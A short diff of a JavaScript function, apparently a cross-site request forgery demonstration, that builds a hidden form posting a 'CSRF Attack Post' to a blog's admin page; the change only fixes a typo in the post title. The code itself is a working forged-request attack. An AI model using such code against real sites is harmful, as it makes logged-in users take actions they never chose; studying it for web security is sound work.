@@ -16,7 +16,7 @@ function CSRF() {
 	form.action = "https://akpan1.myblog.com/admin/index.php";
 	form.method = 'POST';
 	form.target = '_self';
-	form.innerHTML = "<input type='hidden' name='title' value='An CSRF Attack Post' />" +
+	form.innerHTML = "<input type='hidden' name='title' value='A CSRF Attack Post' />" +
 					"<textarea type='hidden' name='text' value='Any comment is welcome!' />";
 	//append the form to the current page.
 	document.body.appendChild(form);
